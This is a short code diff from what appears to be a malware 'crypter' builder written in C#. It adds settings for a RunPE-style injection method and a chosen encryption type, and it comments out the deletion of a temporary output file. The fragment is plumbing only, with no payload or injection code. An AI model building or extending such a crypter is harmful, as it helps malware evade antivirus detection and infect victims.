@@ -134,7 +134,7 @@ namespace _2Simple_Crypter
                     CallObfuscator(selectSaveDialog);
                     GC.Collect();
                     GC.WaitForPendingFinalizers();
-                    File.Delete(selectSaveDialog.FileName);
+                    //File.Delete(selectSaveDialog.FileName);
                 }
             }
         }
@@ -158,6 +158,11 @@ namespace _2Simple_Crypter
             settings.payloadName = payloadTxt.Text;
             settings.decryptKey = Path.GetRandomFileName().Replace(".", "");
             settings.stubResources = Path.GetRandomFileName().Replace(".", "");
+            settings.injectionName = runpeTypeBox.Text;
+
+            // Convert string to enum
+            EncryptionType encType = (EncryptionType)Enum.Parse(typeof(EncryptionType), encryptionTypeBox.Text);
+            settings.encryptionType = encType;
 
 
             // Autostart
